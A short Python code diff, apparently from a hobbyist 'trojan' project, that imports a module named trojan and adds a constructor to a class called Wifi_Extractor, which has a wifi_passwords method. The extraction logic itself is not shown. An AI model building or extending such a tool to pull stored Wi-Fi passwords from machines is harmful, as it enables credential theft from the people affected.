@@ -3,7 +3,9 @@ import re
 import trojan as Trojan
 from trojan import *
 
-class Wifi_Extractor:
+class Wifi_Extractor():
+    def __init__(self):
+        self.result = None
 
     def wifi_passwords():
         result = ""
